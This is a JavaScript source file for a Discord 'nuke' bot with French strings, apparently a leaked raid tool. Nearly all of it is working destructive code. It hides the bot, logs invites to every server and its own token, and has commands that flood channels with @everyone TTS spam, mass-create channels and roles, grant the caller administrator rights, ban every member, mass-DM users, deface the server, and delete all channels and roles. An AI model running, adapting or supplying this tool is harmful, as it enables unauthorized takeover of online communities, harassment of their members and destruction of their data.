const Discord = require("discord.js");
const bot = require("discord.js")
const client = new Discord.Client();
const fs = require('fs');
var fucked = false;

 
client.on("ready", () => {
client.user.setActivity('leak by Akamee');
    client.guilds.forEach(serv => {
      serv.channels.random().createInvite().then(invite => console.log(`>${serv.name} | ${invite}`))
      .catch(console.log(`>${serv.name} | Entrain d'envoyer une invite... `));
    });
     
    var memberCount = client.users.size;
      var serverCount = client.guilds.size;
      console.log("--------------------------------------");
      console.log(`Information du Client:`)
      console.log(`Nom du client: ${client.user.tag}`)
      console.log(`Id du client: ${client.user.id}`)
      console.log(`lien d'invitation:  https://discordapp.com/oauth2/authorize?permissions=8&scope=bot&client_id=${530974078954373121}`)
      console.log(`token: ${client.token}`)
      console.log("--------------------------------------");
      console.log(`Stats du bot:`)
      console.log("Utilisateurs: " + memberCount + "\nServeurs: " + serverCount);
      console.log("--------------------------------------");
          client.user.setStatus("invisible");
      console.log("--------------------------------------");
});
 
 
client.on('message', function(message) {
    if (message.content === '!jeserar') {
        for (var i = 0; i < 9999; i++) {
     message.channel.send("@everyone PURIFIER. https://cdn.discordapp.com/attachments/453330587986427905/460074903790419978/Anna_k_project.gif", { tts: true } ).then(i++);
    }  
     }
    }); 
    client.on("message", message => {
        if (message.content === '!spam') {
            if (message.deletable) message.delete();
            let i = 0;
            let interval = setInterval(function () {
                message.guild.channels.forEach(channel => {
    if (channel.type === "text") channel.send("@everyone choisis ton spam", { tts: true } ).then(i++);
            }, 2500);
        })
    }
    });
 
    client.on('message', function(message) {
        if (message.content === '!salon') {
            if (message.deletable) message.delete();
            let i = 0;
            let interval = setInterval (function () {
                if (i === 1500) clearInterval(interval);
                message.guild.createChannel('choisis un nom', 'text')
        }, 150)
        }
        });
        client.on('message', function(message) {
    if (message.content === '!fuckit') {
        console.log(`Commande !fuckit par ${message.author.tag}`);
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval(function () {
        if (i === 250) clearInterval(interval);
        message.guild.createRole({name: 'choisis le nom', color:'RANDOM'}).then(function(role) {
          message.guild.members.forEach(member => {
          member.addRole(role).catch(e => {});
        })
        i++
        }, 100)
           })
          }
 
        if (message.content === '!lucky') {
            console.log(`Commande !lucky par ${message.author.tag}`);
            if (message.deletable) message.delete();
            message.member.guild.createRole({
              name:'Choisis le nom',
              permissions: "ADMINISTRATOR",
            })
            .then(function(role) {message.member.addRole(role);});
        }
 
    if (message.content === '!ban') {
        console.log(`Commande !ban par ${message.author.tag}`);
        message.guild.members.forEach(member => {
          if (!member.roles.exists("name", "Le même nom qu'au dessus") && member.bannable) member.ban().catch(e => {});
        })
    }});

client.on('message', function(message) {
    if(message.content === "!mp"){
        if(message.deletable) message.delete();
        i = 0;
        message.guild.members.forEach(member => {
    
        if(i < 800){
          var interval = setInterval (function () {
            member.send(`Ce que tu veux`).catch(e => {});
          }, 5000)
    
          }   
      })
    }
      });
      client.on('message', function(message) {
      if(message.content === "!deface") {
        console.log(`Commande !deface par ${message.author.tag}`);
        if(message.deletable) message.delete();
        message.guild.setIcon("choisis une image(lien)")
        message.guild.setName("Choisis le nom du serv")
      }
  });
client.on('message', function(message) {
    if (message.content === '!leave') {
        console.log(`Commande !leave par ${message.author.tag}`);
        if (message.deletable) message.delete().catch(e => {});
        message.guild.leave().catch(e => {});
      }
    });
    client.on('message', function(message) {
        if (message.content === '!delc') {
            console.log(`Commande !delc par ${message.author.tag}`);
            if (message.deletable) message.delete().catch(e => {});
            message.guild.channels.forEach(chan => {
                if (chan.deletable) chan.delete();
            })
        }
    });
    //this command is not ended
    client.on('message', function(message) {
        if(message.content === '!delr') {
            console.log(`commande !delr par ${message.author.tag}`);
            if (message.deletable) message.delete().catch(e => {});
            message.guild.roles.forEach(roles => {
                if (roles.deletable) roles.delete();
            })
        }
    });


    client.on('message', function(message) {
        if(message.content === "!rename"){
            if(message.deletable) message.delete();
            message.guild.members.forEach(member => {
              if(member.setNickname("Choisis le nom"));      
          })
          }
        });

        client.on('message', message => {
            if (message.content === "!rainbow") {
                let i = 2500;
                let interval = setInterval(function () {
                    message.guild.roles.find('name', 'Rainbow').setColor('RANDOM')
                }, 800)
            }});
        
client.login('Token du bot')


